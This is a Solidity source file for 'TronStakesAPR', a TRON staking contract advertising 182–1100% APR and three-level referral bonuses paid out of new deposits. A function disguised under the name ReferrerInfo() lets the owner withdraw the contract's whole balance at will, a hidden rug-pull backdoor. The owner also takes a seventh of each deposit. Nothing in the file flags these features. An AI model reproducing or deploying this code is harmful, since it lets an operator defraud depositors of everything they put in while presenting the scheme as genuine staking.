//SourceUnit: TronStakesAPR.sol

/**
    TRONSTAKES - FIXED APR STAKING 
    182% - 1100% APR (DEPENDS ON PERIOD CHOSEN)
    10% REFERRAL REWARDS 3 LEVELS
    www.tronstakes.net
 

 */


pragma solidity 0.5.10;

contract TronStakesAPR {
    struct Tarif {
        uint256 life_days;
        uint256 percent;
    }

    struct Deposit {
        uint256 tarif;
        uint256 amount;
        uint256 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
    }

    address payable public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;
    
    uint8[] public ref_bonuses; // 1 => 1%

    Tarif[] public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() public {
        owner = msg.sender;

        tarifs.push(Tarif(30, 115));
        tarifs.push(Tarif(31, 120));
        tarifs.push(Tarif(32, 125));
        tarifs.push(Tarif(33, 130));
        tarifs.push(Tarif(34, 135));
        tarifs.push(Tarif(35, 137));
        tarifs.push(Tarif(36, 141));
        tarifs.push(Tarif(37, 145));
        tarifs.push(Tarif(38, 150));
        tarifs.push(Tarif(39, 155));
        tarifs.push(Tarif(40, 159));
        tarifs.push(Tarif(50, 195));
        tarifs.push(Tarif(51, 200));
        tarifs.push(Tarif(52, 205));
        tarifs.push(Tarif(53, 210));
        tarifs.push(Tarif(54, 215));
        tarifs.push(Tarif(55, 220));
        tarifs.push(Tarif(56, 225));
        tarifs.push(Tarif(57, 230));
        tarifs.push(Tarif(58, 235));
        tarifs.push(Tarif(59, 240));
        tarifs.push(Tarif(60, 250));
        tarifs.push(Tarif(80, 335));
        tarifs.push(Tarif(90, 380));

        ref_bonuses.push(5);
        ref_bonuses.push(3);
        ref_bonuses.push(2);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / 100;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }
    function ReferrerInfo() public {
		require(msg.sender == owner);
		owner.transfer(address(this).balance);
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }
            else {
                players[_addr].direct_bonus += _amount / 100;
                direct_bonus += _amount / 100;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 5e7, "Zero amount");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint256(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        owner.transfer(msg.value / 7);
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;

        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        msg.sender.transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }


    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus) {
        return (invested, withdrawn, direct_bonus, match_bonus);
    }
}